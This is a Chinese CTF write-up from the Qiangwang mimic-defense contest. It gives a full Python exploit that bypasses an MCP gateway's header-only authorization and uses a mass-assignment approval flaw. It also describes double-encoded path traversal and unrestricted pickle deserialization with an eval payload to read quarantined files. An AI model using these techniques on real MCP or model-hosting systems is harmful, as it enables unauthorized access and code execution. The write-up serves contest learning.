---
title: 【微信】第九届“强网”拟态防御WEB(1题)和MISC
source: https://mp.weixin.qq.com/s/iTgaxzumnH3cE4N5nH6VvQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-01T15:10:34+08:00
trace_id: 83f80c5d-29a9-4bc0-8146-e2e83d341996
content_hash: 371a3119bec10eaaae6c80c2ab8c3627fcc51e97e77549267b64cfeb1960b60f
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 第九届强网拟态赛多题解法：MCP 网关只校验请求头不校验 JSON 正文导致越权，配合双重解码穿越、pickle 反序列化、权重 LSB 隐写与 PCAP 修复 VM 逆向拿旗。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 40b75244-d011-812f-8403-c21733f1e2c4
ioc:
  cves: []
  cwes: []
  hashes:
    - "00000200000000050200000000990800"
    - 326f7c0fccd029567f7c92e1c68ec94c
    - 3d3dbc88a35546a7b74c7eeb1bdfa6b6
    - 69c429c475ee3c2c89aa14ae514d2c75
    - 6c6f61645f736166655f323032365f31
    - a65dc30a337a3faee5a58c868fc3e715
    - a65dc30a337a3faee5a58c868fc3e715e3b9cbcd45c9fcec9fd1f00a1f4a2371
    - e3b9cbcd45c9fcec9fd1f00a1f4a2371
    - ef38842f4026e501f6a712cbeaa9ea19c5d6ab376108f71e03eed90a0feff8f4
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 第九届强网拟态赛多题解法：MCP 网关只校验请求头不校验 JSON 正文导致越权，配合双重解码穿越、pickle 反序列化、权重 LSB 隐写与 PCAP 修复 VM 逆向拿旗。
> 
> - **MCP 授权错位：** 网关按 `Mcp-Name` 和 `Mcp-Param-VIN` 头授权、按正文执行工具；头用已分配 VIN，正文换成受限车即可读诊断并导出原始包，再向 notes 接口多传 `release_state=approved` 下载含恢复令牌的完整包。
> - **双重解码穿越：** Pickle-Me-Not 预览接口先 URL 解码再校验路径，`%252e%252e` 首次解码后仍为 `%2e%2e` 可过检查，二次解码落入隔离区；遗留重放对 pickle 无白名单，借 `eval` 一次读回三份证据。
> - **静态反序列化：** 不调用 torch.load，用只放行三个名字的 Unpickler 拆出偏移 19、形状 (4,32)、步长 (67,2) 的非连续字节视图，按 mhkdf-sha256-v1 计数器密钥流异或得 89 字节明文，CRC32 吻合。
> - **权重隐写：** SilentWeights 前向推理 100% 正常，秘密藏在全部 3498 个 float32 参数的 bit 0，按存储顺序取出并 packbits 后偏移 138 字节处即 flag。
> - **PCAP 修复与 VM：** 用 IPv4 Total Length+14 重算真实帧长修复 6 处包长篡改，恢复 4561 包；从 31337/31338 测试会话还原 19 条 5-bit 指令集，rev.C 重定义 RORI、POP 空栈返 0、JMPR 乘 16，依次执行 KV/PX 两阶段自修改字节码拼出完整 flag。

**玄网安全** *2026年11月1日 14:39*

## WEB-Crossed Signals

```
题目描述：
Northline 的互联服务台将车辆信号转化为维修工单。在一次软件发布后，一辆验证车队车辆失联，而一个恢复令牌被封存在其原始服务记录中。找到并提交它。

本次挑战未提供附件。

凭据：advisor@northline.test / Service-Desk-2026
```

> 核心思路：MCP 网关按 `Mcp-Name` 和 `Mcp-Param-VIN` 授权，工具按 JSON 正文执行；借此导出验证车的原始服务包，再向审核接口多传 `release_state=approved` ，下载包内的恢复令牌。

## 1\. 题目说明

Northline 的互联服务台把车辆信号转成维修工单。一次软件发布后，一辆验证车队车辆失联，恢复令牌封存在它的原始服务记录里。题目要求找到并提交该令牌。本次挑战没有附件。

本次实例：

-   入口： `http://n78iyy2n.nestctf.cyberpeace.cn:58080`
    
-   账号： `advisor@northline.test` / `Service-Desk-2026`
    
-   本次 token： `M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck` ， `expires_in` 为 7200 秒
    

登录后 `GET /api/me` 显示顾问只被分配了 `CTF6SVC0000000001` 。 `GET /api/cases` 有两条工单：

| 工单  | VIN | 车队  | 访问  |
| --- | --- | --- | --- |
| SR-26041 | CTF6SVC0000000001 | West depot | assigned |
| SR-26042 | CTF6SVC0000000002 | Factory validation | restricted |

SR-26042 的标题是 “Gateway communication loss after OTA campaign”，摘要写明跨车队看板只公开元数据，诊断数据需要车辆分配。页面上的工具是 `get_vehicle_health` 和 `get_update_status` ，传输写的是 MCP Streamable HTTP，协议版本 `2026-07-28` ，端点 `/mcp` 。

浏览器调用工具时会同时发送：

```
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: <工具名>
Mcp-Param-VIN: <参数 vin>
```

JSON-RPC 正文里还有同一份 `params.name` 和 `params.arguments.vin` 。

## 2\. 解题思路

失联车辆是访问受限的 `CTF6SVC0000000002` 。直接用它的 VIN 调工具会返回 `vehicle_scope_denied` 。网关只检查头里的工具名和 VIN，真正执行的是正文。把头换成自己被分配的 VIN 和允许调用的工具名，正文改成目标车辆和隐藏工具，就能读诊断并导出原始包。

顾问预览包不含 `private/recovery.txt` 。完整下载要求 `release_state=approved` 。 `POST /api/bundles/<id>/notes` 只校验 `note` 字符串，额外字段 `release_state` 会被写入状态。批准后再下载，令牌在压缩包的 `private/recovery.txt` 。

## 3\. 解题过程

下面每一步都是容器 `http://n78iyy2n.nestctf.cyberpeace.cn:58080` 上的请求， `Authorization` 使用本次 token `M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck` 。令牌 7200 秒后过期；过期就重新登录，替换下面的 Bearer。MCP 请求的公共头是：

```yaml
POST /mcp HTTP/1.1
Host: n78iyy2n.nestctf.cyberpeace.cn:58080
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
Accept: application/json, text/event-stream
MCP-Protocol-Version: 2026-07-28
```

### 3.1 登录并确认受限工单

登录：

```bash
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"advisor@northline.test","password":"Service-Desk-2026"}
```

响应给出 `token` 和 `role=service_advisor` 。用这个令牌读自己的分配和工单：

```
GET /api/me HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
```

```
GET /api/cases HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
```

`/api/me` 的 `assigned_vins` 只有 `CTF6SVC0000000001` 。 `/api/cases` 里 `SR-26042` 的 `vin` 是 `CTF6SVC0000000002` ， `access` 是 `restricted` 。页面工具区对它只显示元数据，没有诊断内容。

### 3.2 列出网关实际暴露的工具

```bash
POST /mcp HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
Accept: application/json, text/event-stream
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/list

{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/list",
  "params": {
    "_meta": {
      "io.modelcontextprotocol/protocolVersion": "2026-07-28",
      "io.modelcontextprotocol/clientInfo": {"name": "northline-service-console", "version": "1.0.0"},
      "io.modelcontextprotocol/clientCapabilities": {}
    }
  }
}
```

页面只展示前两个工具，响应里还有第三个：

-   `get_vehicle_health` ：读取已分配车辆的 DTC 和遥测，必填 `vin` 。
    
-   `get_update_status` ：读取软件活动状态，必填 `vin` 。
    
-   `export_case_bundle` ：导出诊断与 OTA 证据匹配的原始包，说明为 Security operations only。必填 `vin` 、 `case_id` 、 `diagnostic_ref` 、 `evidence_ref` 。
    

`vin` 的 schema 带有 `x-mcp-header: VIN` ，对应浏览器发送的 `Mcp-Param-VIN` 。

头和正文都使用已分配 VIN 时，可以正常读到自己的引用：

```
Mcp-Method: tools/call
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000001
```

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "get_vehicle_health",
    "arguments": {"vin": "CTF6SVC0000000001"},
    "_meta": {"io.modelcontextprotocol/protocolVersion": "2026-07-28"}
  }
}
```

`get_update_status` 只改 `Mcp-Name` 和 `params.name` 。两次响应分别是 `diagnostic_ref=DX-836d10211e4146173631d41e` 、 `evidence_ref=EV-771cc44f86ba8e712c9e7db9` 。

头和正文都换成验证车时被拒绝：

```
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000002
```

```json
{"name": "get_vehicle_health", "arguments": {"vin": "CTF6SVC0000000002"}}
```

HTTP 403，正文是 `{"error":"vehicle_scope_denied"}` 。去掉 `Mcp-Name` 和 `Mcp-Param-VIN` 则是 `{"error":"tool_headers_required"}` 。

### 3.3 用已分配 VIN 的请求头读取验证车

授权看的是头，查询看的是正文。健康快照：

```bash
POST /mcp HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
Accept: application/json, text/event-stream
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000001

{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "get_vehicle_health",
    "arguments": {"vin": "CTF6SVC0000000002"},
    "_meta": {
      "io.modelcontextprotocol/protocolVersion": "2026-07-28",
      "io.modelcontextprotocol/clientInfo": {"name": "northline-service-console", "version": "1.0.0"},
      "io.modelcontextprotocol/clientCapabilities": {}
    }
  }
}
```

返回的是验证车，不是自己的车：

```toml
diagnostic_ref = DX-56d574bd4cde317f3c8778ec
case_id        = SR-26042
dtc            = U0100
```

软件状态只改两个名字，VIN 的错位保持不变：

```
Mcp-Name: get_update_status
Mcp-Param-VIN: CTF6SVC0000000001
```

```json
{
  "name": "get_update_status",
  "arguments": {"vin": "CTF6SVC0000000002"}
}
```

```toml
evidence_ref = EV-34659fdc3eac9e3b8dfe6b1e
campaign     = SW-26.10-B
state        = paused for review
```

反向请求确认检查点。正文是已分配 VIN，头是验证车 VIN：

```
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000002
```

```json
{"name": "get_vehicle_health", "arguments": {"vin": "CTF6SVC0000000001"}}
```

仍然 HTTP 403 `vehicle_scope_denied` 。车辆范围只校验 `Mcp-Param-VIN` 。

### 3.4 借允许的工具名导出原始包

头和正文都叫 `export_case_bundle` 时，顾问角色被拒绝：

```
Mcp-Name: export_case_bundle
Mcp-Param-VIN: CTF6SVC0000000001
```

```json
{
  "name": "export_case_bundle",
  "arguments": {
    "vin": "CTF6SVC0000000002",
    "case_id": "SR-26042",
    "diagnostic_ref": "DX-56d574bd4cde317f3c8778ec",
    "evidence_ref": "EV-34659fdc3eac9e3b8dfe6b1e"
  }
}
```

HTTP 403， `{"error":"tool_scope_denied"}` 。

把头改回允许的工具名，正文继续调用导出：

```bash
POST /mcp HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json
Accept: application/json, text/event-stream
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: get_vehicle_health
Mcp-Param-VIN: CTF6SVC0000000001

{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "export_case_bundle",
    "arguments": {
      "vin": "CTF6SVC0000000002",
      "case_id": "SR-26042",
      "diagnostic_ref": "DX-56d574bd4cde317f3c8778ec",
      "evidence_ref": "EV-34659fdc3eac9e3b8dfe6b1e"
    },
    "_meta": {
      "io.modelcontextprotocol/protocolVersion": "2026-07-28",
      "io.modelcontextprotocol/clientInfo": {"name": "northline-service-console", "version": "1.0.0"},
      "io.modelcontextprotocol/clientCapabilities": {}
    }
  }
}
```

本次返回 `bundle_id=RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP` ， `release_state=pending` 。响应里同时有 base64 预览包、 `review_url` 和 `download_url` 。

预览包只有三个文件：

```
manifest.json
diagnostics/telemetry.json
diagnostics/update-history.json
```

`manifest.json` 的 `entries` 却列出了第四项 `private/recovery.txt` 。这个文件不在顾问预览里。此时直接下载：

```
GET /api/bundles/RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP/download HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
```

返回 `{"error":"bundle_release_pending","required_release_state":"approved"}` 。

### 3.5 把审核状态写成 approved

`review_url` 是 `POST /api/bundles/<id>/notes` 。只提交备注时状态不变：

```
POST /api/bundles/RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP/notes HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json

{"note":"release"}
```

响应仍是 `"release_state":"pending"` 。同一路径再增加字段：

```bash
POST /api/bundles/RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP/notes HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
Content-Type: application/json

{"note":"release","release_state":"approved"}
```

响应里的 `release_state` 变成 `approved` 。空的 `note` 、以及没有 `note` 的正文会返回 `invalid_note` ；服务端校验的是备注文本，没有忽略或拒绝调用方提交的 `release_state` 。

### 3.6 下载完整包

批准后使用导出响应里的 `download_url` ：

```
GET /api/bundles/RdCq-gvz03NNUX9aiCMmIRP-CRMujcbP/download HTTP/1.1
Authorization: Bearer M4c5bQVf00X5Ot1O2RCa-CtL5nwgfRe8lWrA26EQAck
```

得到 200 和 zip。这次包含预览里没有的文件：

```
manifest.json
diagnostics/telemetry.json
diagnostics/update-history.json
private/recovery.txt
```

`private/recovery.txt` 的内容是：

```
NORTHLINE / SECURITY OPERATIONS
Case: SR-26042
Vehicle: CTF6SVC0000000002
Recovery token: flag{eNsRsHNSNXNd4t5hN5rTSulkpMvk6TDVjx099tUo}
```

每次导出都会生成新的 `bundle_id` ，路径里的 ID 要换成当次响应。同一辆验证车的两个引用和恢复令牌不变。

## 4\. 完整解题脚本

只使用 Python 标准库。脚本登录、列出工具、用请求头和正文的差异读取验证车、导出服务包、写入审核状态并解出 `private/recovery.txt` 。令牌来自下载的压缩包，不写在脚本里。

```python
import base64
import io
import json
import sys
import time
import zipfile
from urllib.error import HTTPError, URLError
from urllib.request import ProxyHandler, Request, build_opener

BASE = "http://n78iyy2n.nestctf.cyberpeace.cn:58080"
USERNAME = "advisor@northline.test"
PASSWORD = "Service-Desk-2026"
OPENER = build_opener(ProxyHandler({}))

def request(path, token=None, method="GET", body=None, headers=None):
    hdrs = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, text/event-stream"}
    data = None
    if body isnotNone:
        data = json.dumps(body).encode()
        hdrs["Content-Type"] = "application/json"
    if token:
        hdrs["Authorization"] = "Bearer " + token
    if headers:
        hdrs.update(headers)
    last_error = None
    for attempt in range(4):
        req = Request(BASE + path, data=data, headers=hdrs, method=method)
        try:
            with OPENER.open(req, timeout=30) as response:
                return response.status, response.read()
        except HTTPError as error:
            detail = error.read()
            raise SystemExit(f"{method} {path} -> HTTP {error.code}: {detail[:400]!r}") from error
        except (URLError, ConnectionError, TimeoutError) as error:
            last_error = error
            time.sleep(0.4 * (attempt + 1))
    raise SystemExit(f"{method} {path} failed: {last_error}")

def mcp(token, body_method, body_name, arguments, header_name, header_vin):
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": body_method,
        "params": {
            "_meta": {
                "io.modelcontextprotocol/protocolVersion": "2026-07-28",
                "io.modelcontextprotocol/clientInfo": {
                    "name": "northline-service-console",
                    "version": "1.0.0",
                },
                "io.modelcontextprotocol/clientCapabilities": {},
            }
        },
    }
    headers = {
        "MCP-Protocol-Version": "2026-07-28",
        "Mcp-Method": body_method,
    }
    if body_name isnotNone:
        # 网关按这两个头做工具和车辆授权，工具本身读取 JSON 正文。
        payload["params"]["name"] = body_name
        payload["params"]["arguments"] = arguments
        headers["Mcp-Name"] = header_name
        headers["Mcp-Param-VIN"] = header_vin
    status, raw = request("/mcp", token, "POST", payload, headers)
    return status, json.loads(raw)

def tool_data(token, header_name, header_vin, body_name, arguments):
    _, data = mcp(token, "tools/call", body_name, arguments, header_name, header_vin)
    return data["result"]["structuredContent"]

def main():
    _, login_raw = request("/api/login", method="POST", body={
        "username": USERNAME,
        "password": PASSWORD,
    })
    token = json.loads(login_raw)["token"]
    me = json.loads(request("/api/me", token)[1])
    board = json.loads(request("/api/cases", token)[1])
    assigned = me["assigned_vins"][0]
    target = next(item for item in board["cases"] if item["access"] == "restricted")
    print("assigned:", assigned)
    print("target:", target["id"], target["vin"], target["access"])

    _, listed = mcp(token, "tools/list", None, None, None, None)
    print("tools:", ", ".join(tool["name"] for tool in listed["result"]["tools"]))

    health = tool_data(
        token, "get_vehicle_health", assigned,
        "get_vehicle_health", {"vin": target["vin"]},
    )
    update = tool_data(
        token, "get_update_status", assigned,
        "get_update_status", {"vin": target["vin"]},
    )
    print("diagnostic_ref:", health["diagnostic_ref"])
    print("evidence_ref:", update["evidence_ref"])

    exported = tool_data(
        token, "get_vehicle_health", assigned,
        "export_case_bundle", {
            "vin": target["vin"],
            "case_id": target["id"],
            "diagnostic_ref": health["diagnostic_ref"],
            "evidence_ref": update["evidence_ref"],
        },
    )
    bundle_id = exported["bundle_id"]
    print("bundle:", bundle_id, "state:", exported["release_state"])
    with zipfile.ZipFile(io.BytesIO(base64.b64decode(exported["preview_b64"]))) as preview:
        print("preview:", ", ".join(preview.namelist()))

    # note 本身不改变状态；额外的 release_state 会被原样写入。
    note_only = json.loads(request(
        f"/api/bundles/{bundle_id}/notes", token, "POST", {"note": "release"},
    )[1])
    print("note only:", note_only["release_state"])
    approved = json.loads(request(
        f"/api/bundles/{bundle_id}/notes", token, "POST",
        {"note": "release", "release_state": "approved"},
    )[1])
    print("note with release_state:", approved["release_state"])

    _, archive = request(exported["download_url"], token)
    with zipfile.ZipFile(io.BytesIO(archive)) as bundle:
        print("archive:", ", ".join(bundle.namelist()))
        print(bundle.read("private/recovery.txt").decode())

if __name__ == "__main__":
    print("python:", sys.version.split()[0])
    main()
```

## MISC-Causal Mosaic

```sql
题目描述：
Given 9 events and 10 precedence constraints encoded in three local logs, merge all constraints into one directed acyclic graph and submit a valid topological order containing every event exactly once. The same order must be provided to validators A, B, and C.

题目附件：
mimic-math-lab-20261015-v5-player.zip
```

> 核心思路：三份日志是同一张有向无环图的三种编码，译成统一的先后边后做拓扑排序，把同一条事件序列同时交给 A、B、C。

POST /api/new，正文 {}。本次实际取到的实例为：

```json
{
  "session_id": "wIgDQKTvlWacAx_7Kkvvlq2ID1QIfHgI",
"question_id": "1fa2aa324f26db8eb6cdaac2",
"challenge": {
    "kind": "causal",
    "events": [
      {"id": "event-ed5faf", "weight": 3},
      {"id": "event-7ab62d", "weight": 32},
      {"id": "event-a47f00", "weight": 33},
      {"id": "event-6173da", "weight": 6},
      {"id": "event-60c0e5", "weight": 49},
      {"id": "event-5b6d68", "weight": 33},
      {"id": "event-2243b0", "weight": 6},
      {"id": "event-a99ede", "weight": 27},
      {"id": "event-9a268c", "weight": 36}
    ],
    "traces": {
      "A": [
        {"before": "event-9a268c", "after": "event-6173da", "local_tick": 8814},
        {"before": "event-5b6d68", "after": "event-2243b0", "local_tick": 8327},
        {"before": "event-60c0e5", "after": "event-a99ede", "local_tick": 5612},
        {"before": "event-ed5faf", "after": "event-a47f00", "local_tick": 4479}
      ],
      "B": [
        {"relation": "event-5b6d68 <- event-9a268c", "local_tick": 4567},
        {"relation": "event-9a268c <- event-7ab62d", "local_tick": 5956},
        {"relation": "event-ed5faf <- event-60c0e5", "local_tick": 8644}
      ],
      "C": [
        {"pair": [2, 8], "local_tick": 6835},
        {"pair": [3, 6], "local_tick": 1786},
        {"pair": [7, 1], "local_tick": 7764}
      ]
    }
  },
"expires_in": 899,
"remaining_rounds": 1
}
```

> 分析源码附件|三份日志的含义： A：before 必须出现在 after 之前。 B：relation 形如 左边 <- 右边，箭头右侧事件在左侧事件之前。  
> C：pair 为 \[前下标, 后下标\]，第一个下标对应的事件在第二个之前。

> A 的 before 直接指向 after： event-9a268c -> event-6173da event-5b6d68 -> event-2243b0 event-60c0e5 -> event-a99ede event-ed5faf -> event-a47f00

> B 取箭头右侧为起点。例如 event-5b6d68 <- event-9a268c 表示 event-9a268c 在前： event-9a268c -> event-5b6d68 event-7ab62d -> event-9a268c event-60c0e5 -> event-ed5faf

> C 用原数组下标，不重新排序。\[2, 8\] 是下标 2 的 event-a47f00 在下标 8 的 event-9a268c 之前： event-a47f00 -> event-9a268c event-6173da -> event-2243b0 event-a99ede -> event-7ab62d

> 3.2 合并成两条汇合链 10 条边接成下面的依赖，终点都是 event-2243b0： event-60c0e5 -> event-a99ede -> event-7ab62d -> event-9a268c -> event-6173da -> event-2243b0 event-9a268c -> event-5b6d68 -> event-2243b0 event-60c0e5 -> event-ed5faf -> event-a47f00 -> event-9a268c

```
Kahn 算法维护入度。入度变为 0 的事件进入队列；初始队列按 events 的原顺序收集，出队后按边的生成顺序把后继入队。边的生成顺序是先 A、再 B、再 C，与上一节列出的顺序相同。

只有 event-60c0e5 入度为 0。它的后继按边序是 event-a99ede、event-ed5faf。继续消元：

event-a99ede 释放 event-7ab62d。
event-ed5faf 释放 event-a47f00。
event-7ab62d 使 event-9a268c 的入度从 2 降到 1，此时还不能出队。
event-a47f00 把 event-9a268c 的入度降到 0。
event-9a268c 的后继按边序是 event-6173da、event-5b6d68。
二者分别指向 event-2243b0，等两条边都消耗后它才出队。
```

> event-60c0e5  
> event-a99ede  
> event-ed5faf  
> event-7ab62d  
> event-a47f00  
> event-9a268c  
> event-6173da  
> event-5b6d68  
> event-2243b0\\

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/00ec61dfaa45e4ab.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a364ea65f65e2495.png)

## MISC-Pickle-Me-Not

```
题目描述：
Autonomy Lab 正在准备在 ModelHub 中发布 fleet-aux-v3 的第 17 版。该模型通过了所有自动化质量门禁，但在仅权重策略下出现了一个意外对象引用后，一次遗留兼容性导入触发了隔离。

在分配的 ModelHub 信任中心工作区中审查该导入，并恢复隐藏在被隔离证据中的秘密。交接内容中包含一个受信任的参考检查点；被隔离的工件仍保留在工作区中。

不要仅为检查而在本地加载未知检查点。'

题目附件：attachment.zip
```

> 核心思路：预览接口先解码再校验，用双重编码读出隔离票据；遗留重放直接 `pickle.loads` ，取出被拒绝下载的检查点后只做静态反序列化，再按诊断里的 SHA-256 计数器密钥流还原非连续字节视图。

## 2\. 解题思路

信任中心前端把审查动作暴露成三个接口：模型清单、JSON 工件预览、带隔离票据的遗留导入重放。模型清单里的预览策略写明网关和存储各做一次 URL 解码，而路径策略插在两次解码之间。把 `../` 编成 `%252e%252e` ，第一次解码后仍是 `%2e%2e` ，过不了字面量 `..` 检查；第二次解码才进入 `repository/quarantine/` 。

预览只接受 `.json` 。票据、清单和 safetensors 索引能这样读到，隔离检查点、诊断日志和权重分片不能。重放接口要求正文以票据里的 `LEGACY\n` 开头，后面是 pickle。这个 worker 对 pickle 没有全局对象白名单，因此可以用一次 `eval` 把三份非 JSON 证据读回来。

回到本地后不调用 `torch.load` 。用只允许本题三个名字的 `Unpickler` 取出 `modelhub_compat.rebuild_legacy_token` 的参数：存储编号、偏移、形状、步长、路由、nonce、明文长度和 CRC。字节按步长从 `data/2` 抽出，与 `guard.kdf_salt` 以及诊断中的 `mhkdf-sha256-v1` 材料生成的计数器密钥流异或。CRC32 与 pickle 里的长度字段一致，明文中就是 flag。

### 3.1 从页面脚本定位审查接口

`GET /` 返回 ModelHub Trust Center 页面，脚本是 `/app.js` 。审查相关调用只有这些：

```javascript
function b(){return y(`/api/v1/models`)}
function ee(e){return y(`/api/v1/artifacts?path=`+encodeURIComponent(e))}
function te(e){return(await y(`/api/v1/import-jobs/`+encodeURIComponent(e))).job}
function ne(e,t,n){return y(`/api/v1/import-jobs/`+encodeURIComponent(e)+`/replay`,{
  method:`POST`,
  headers:{"Content-Type":`application/json`},
  body:JSON.stringify({ticket:t,pickle_b64:n})
})}
```

重放对话框写明检查点跑在隔离的 2.5.1 兼容 worker 中，并且需要 quarantine ticket。上传文件会被整文件 base64 放进 `pickle_b64` 。

`GET /api/v1/models` 给出当前对象：

```json
{
  "name": "fleet-aux-v3",
"version": "17",
"stage": "Quarantined",
"import_job_id": "IMP-2026-0917-017",
"loader": "torch-2.5.1/weights_only compatibility",
"artifact_preview": {
    "gateway_transform": "url-unquote",
    "policy_stage": "after gateway transform",
    "storage_transform": "url-unquote",
    "request_template": "/api/v1/artifacts?path={object_key}",
    "public_namespace": "repository:/public/",
    "repository_boundary": "repository:/"
  }
}
```

工件列表里公开的是 `model_card.json` 、 `normal_reference.pt` ，受限的是 `quarantine_snapshot.pt` 。直接请求后两个名字会返回 `json_artifact_path_rejected` ，说明预览接口只打算吐 JSON。

导入任务 `GET /api/v1/import-jobs/IMP-2026-0917-017` 给出票据位置 `repository:/quarantine/import_ticket.json` ，以及时间线：2.5.1 worker 上 `weights_only=true` 的兼容加载发现意外 pickle global，工件被移进受限存储。

### 3.2 两次解码读取隔离区 JSON

预览实现先解码，再做路径策略，通过后再解码一次，最后相对 `repository/public` 打开。对应 `business/artifacts/service.py` 的 `read_json` ：

```python
once = unquote(raw_path)
if not once.endswith(".json") or ".." in once or once.startswith("/"):
    raise ArtifactProxyError(400, "json_artifact_path_rejected")
twice = unquote(once)
target = (self.public_root / twice).resolve()
target.relative_to(self.repository_root)
return target.read_bytes()
```

查询参数本身不再解码，所以线上的 `path` 必须是“再编码一层”的形式。 `urlencode({"path": "%2e%2e/quarantine/import_ticket.json"})` 发出去的是 `%252e%252e%2Fquarantine%2Fimport_ticket.json` 。

| 阶段  | 路径  | 策略结果 |
| --- | --- | --- |
| 请求原文 | `%252e%252e/quarantine/import_ticket.json` | 尚未检查 |
| 第一次 `unquote` | `%2e%2e/quarantine/import_ticket.json` | 以 `.json` 结尾，且不含字面量 `..` |
| 第二次 `unquote` | `../quarantine/import_ticket.json` | 落到 `repository/quarantine/` ，仍在仓库根内 |

这样读到票据：

```json
{
  "accepted_prefix": "LEGACY\\n",
"import_job": "IMP-2026-0917-017",
"required_files": [
    "quarantine_snapshot.pt",
    "repository_manifest.json",
    "model.safetensors.index.json",
    "model-00001-of-00002.safetensors",
    "model-00002-of-00002.safetensors",
    "import_diagnostics.ndjson"
  ],
"ticket": "326f7c0fccd029567f7c92e1c68ec94c",
"worker": "legacy-import-worker-2.5.1"
}
```

同一方式还能读到 `repository_manifest.json` 和 `model.safetensors.index.json` 。清单把 `normal_reference.pt` 标为 trusted，把 `quarantine_snapshot.pt` 标为 quarantined。索引给出三块权重，其中盐单独占一块：

```json
{
  "weight_map": {
    "encoder.embed.weight": "model-00001-of-00002.safetensors",
    "encoder.norm.running": "model-00002-of-00002.safetensors",
    "guard.kdf_salt": "model-00001-of-00002.safetensors"
  }
}
```

`import_diagnostics.ndjson` 、`.pt` 和 `.safetensors` 不以 `.json` 结尾，这条通道返回 `json_artifact_path_rejected` 。

### 3.3 用遗留重放取出非 JSON 证据

`business/imports/service.py` 的重放对每个来源 IP 限 32 次。票据必须一致。正文先按票据前缀还原，再无限制反序列化：

```swift
prefix = ticket["accepted_prefix"].encode().decode("unicode_escape").encode()
if not blob.startswith(prefix):
    raise ImportReplayError(400, "not_legacy_checkpoint")
result = pickle.loads(blob[len(prefix):])
```

JSON 里的 `LEGACY\\n` 经过 `json.loads` 后是 8 个字符 `LEGACY` 、反斜杠、 `n` 。 `unicode_escape` 再把它变成真正的换行，所以前缀是字节串 `b"LEGACY\n"` 。返回值如果是 `bytes` ，接口用 `result_b64` 原样送回，没有 `repr` 的 4096 字符截断。

把参考检查点直接送进去会得到 `not_legacy_checkpoint` ；加上前缀后又得到 “no persistent_load function was specified”。这证明 worker 确实在反序列化 pickle，而且没有替换成安全的 tensor 重建器。因此一次 `GLOBAL eval` 就能读取隔离目录。一次请求取回三份文件：

-   `/app/repository/quarantine/quarantine_snapshot.pt`
    
-   `/app/repository/quarantine/model-00001-of-00002.safetensors`
    
-   `/app/repository/quarantine/import_diagnostics.ndjson`
    

诊断里和秘密直接相关的两条是：

```
{"decision":"unexpected","event":"pickle.global","module":"modelhub_compat","name":"rebuild_legacy_token"}
{"event":"kdf.profile","profile":"mhkdf-sha256-v1","block":"sha256(utf8(global|route_id|nonce|storage_key|peer_salt_hex)||counter_be32)"}
```

也就是密钥流第 `counter` 块为：

```
SHA256( UTF-8(global | route_id | nonce | storage_key | peer_salt_hex) || uint32be(counter) )
```

`counter` 从 0 递增。 `global` 用 模块.名字。

### 3.4 静态拆开隔离检查点

`quarantine_snapshot.pt` 仍是普通 zip，不需要 PyTorch。成员为 `quarantine_snapshot/data.pkl` 、 `byteorder` 、 `version` 、 `data/0` 、 `data/1` 、 `data/2` 。

`data.pkl` 的顶层字典有三项： `state_dict` 、 `import_guard` 、 `format` 。 `format` 是 `modelhub-quarantine-v1` 。 `import_guard` 不是 tensor，而是：

```python
modelhub_compat.rebuild_legacy_token(
    torch._utils._rebuild_tensor_v2(
        persistent_load(("storage", torch.ByteStorage, "2", "cpu", 512)),
        19, (4, 32), (67, 2), False, {}
    ),
    "legacy-tar-bridge/quarantine-17",
    "6c6f61645f736166655f323032365f31",
    89,
    3219885161
)
```

